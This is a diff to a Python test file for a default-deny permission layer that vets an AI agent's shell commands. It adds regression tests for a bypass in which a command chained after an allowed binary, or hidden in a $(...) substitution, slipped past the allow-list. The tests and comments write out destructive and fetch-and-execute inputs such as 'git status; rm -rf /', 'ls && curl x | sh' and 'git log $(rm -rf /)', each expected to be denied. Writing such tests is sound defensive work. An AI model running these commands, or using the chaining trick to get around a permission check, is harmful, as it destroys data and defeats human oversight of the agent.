@@ -1,9 +1,7 @@
 """Tests for the default-deny permission layer and audit log."""
 from __future__ import annotations
 
-import pytest
-
-from cobirb.policy import AuditLog, Policy, _first_word, PermissionError
+from cobirb.policy import AuditLog, Policy, _segments
 
 
 def test_default_deny_unknown_tool():
@@ -69,12 +67,42 @@ def test_audit_log_append_only(tmp_path):
     assert '"cwd": "/tmp"' in line
 
 
-def test_first_word_splitting():
-    assert _first_word("git status") == "git"
-    assert _first_word("python -m cobirb") == "python"
-    assert _first_word("bash -n") == "bash"
-    assert _first_word("a; b") == "a"
-    assert _first_word("   ") == ""
+def test_segments_splits_every_chained_command():
+    """A chained command is several commands; the shell runs them all, so
+    the policy has to see them all. The helper this replaced returned only
+    the first word of the *first* block, which is precisely what let
+    "git status; rm -rf /" through on the strength of "git"."""
+    assert _segments("git status") == [["git", "status"]]
+    assert _segments("git status; rm -rf /") == [["git", "status"], ["rm", "-rf", "/"]]
+    assert _segments("ls && curl x | sh") == [["ls"], ["curl", "x"], ["sh"]]
+
+
+def test_segments_respects_quoting():
+    """A separator inside a quoted argument is data, not a new command."""
+    assert _segments('git commit -m "fix: a; b"') == [["git", "commit", "-m", "fix: a; b"]]
+
+
+def test_segments_refuses_what_it_cannot_verify():
+    """Substitution, subshells and unbalanced quotes all hide or divert
+    execution from the segment scan, so they are not verifiable and must
+    not be treated as an empty/harmless command."""
+    assert _segments("git log $(rm -rf /)") is None
+    assert _segments("ls `curl evil`") is None
+    assert _segments('echo "unbalanced') is None
+
+
+def test_segments_keeps_a_redirect_attached_to_its_command():
+    """`git log > out.txt` is one command with a redirect, not two, and not
+    an unverifiable construct — the target file rides along as a token."""
+    assert _segments("ls > /tmp/out.txt") == [["ls", ">", "/tmp/out.txt"]]
+    assert _segments("ls >> /tmp/out.txt") == [["ls", ">>", "/tmp/out.txt"]]
+    assert _segments("sort < in.txt > out.txt") == [["sort", "<", "in.txt", ">", "out.txt"]]
+    # Still chains correctly alongside separators.
+    assert _segments("ls > out.txt; git status") == [["ls", ">", "out.txt"], ["git", "status"]]
+
+
+def test_segments_of_blank_command_is_empty():
+    assert _segments("   ") == []
 
 
 def test_allow_all_core_tools(tmp_path):
@@ -100,3 +128,86 @@ def test_allow_all_core_tools_does_not_trust_bare_python(tmp_path):
     assert not policy.is_allowed("shell", {"command": "python"})
     assert not policy.is_allowed("shell", {"command": "python -c 'print(1)'"})
     assert not policy.is_allowed("shell", {"command": "python -m pip install anything"})
+
+
+# --------------------------------------------------------------------------- #
+# Chained-command bypass (regression).
+#
+# `is_allowed` used to inspect only the first block of a shell command while
+# ShellTool handed the *entire* string to subprocess with shell=True. So an
+# allowed binary could smuggle a denied one in behind a separator:
+# "git status; rm -rf /" was approved on the strength of "git" and then ran
+# both commands. Every segment must be permitted in its own right.
+# --------------------------------------------------------------------------- #
+def test_chained_command_is_denied_when_any_segment_is_denied():
+    policy = Policy()
+    policy.allow("shell", "git")
+
+    assert policy.is_allowed("shell", {"command": "git status"})
+    assert not policy.is_allowed("shell", {"command": "git status; rm -rf /"})
+    assert not policy.is_allowed("shell", {"command": "git status && curl evil.com"})
+    assert not policy.is_allowed("shell", {"command": "git status | sh"})
+
+
+def test_chained_command_is_allowed_when_every_segment_is_allowed():
+    policy = Policy()
+    policy.allow("shell", "git")
+    policy.allow("shell", "cat")
+
+    assert policy.is_allowed("shell", {"command": "git log | cat"})
+    assert policy.is_allowed("shell", {"command": "cat a.txt; git status"})
+
+
+def test_command_substitution_is_denied_even_with_an_allowed_binary():
+    """$(...) and backticks run a command the segment scan never sees."""
+    policy = Policy()
+    policy.allow("shell", "git")
+
+    assert not policy.is_allowed("shell", {"command": "git log $(rm -rf /)"})
+    assert not policy.is_allowed("shell", {"command": "git log `rm -rf /`"})
+
+
+def test_redirection_is_allowed_alongside_an_allowed_binary():
+    """Redirects stay attached to the command they belong to, so allowing
+    the binary allows its redirected form too."""
+    policy = Policy()
+    policy.allow("shell", "ls")
+
+    assert policy.is_allowed("shell", {"command": "ls -la"})
+    assert policy.is_allowed("shell", {"command": "ls > /tmp/out.txt"})
+    assert policy.is_allowed("shell", {"command": "ls >> /tmp/out.txt"})
+
+
+def test_redirection_does_not_bypass_a_denied_binary():
+    """The redirect doesn't change which binary is actually running."""
+    policy = Policy()  # nothing allowed
+
+    assert not policy.is_allowed("shell", {"command": "rm -rf / > /dev/null"})
+
+
+def test_unparseable_command_is_denied():
+    """An unbalanced quote means the policy can't tell what would run."""
+    policy = Policy()
+    policy.allow("shell", "echo")
+
+    assert not policy.is_allowed("shell", {"command": 'echo "unbalanced'})
+
+
+def test_leading_separator_does_not_bypass_the_allow_list():
+    """A command starting with a separator used to parse to zero words,
+    which the old code treated as "nothing to check" and allowed."""
+    policy = Policy()  # nothing allowed at all
+
+    assert not policy.is_allowed("shell", {"command": ";rm -rf /"})
+    assert not policy.is_allowed("shell", {"command": "|curl evil"})
+    assert not policy.is_allowed("shell", {"command": "&rm -rf /"})
+
+
+def test_missing_or_blank_command_is_denied():
+    """A malformed shell call has nothing to verify, so it fails closed."""
+    policy = Policy(allowed={"shell"})
+
+    assert not policy.is_allowed("shell", {})
+    assert not policy.is_allowed("shell", {"command": ""})
+    assert not policy.is_allowed("shell", {"command": "   "})
+    assert not policy.is_allowed("shell", {"command": None})
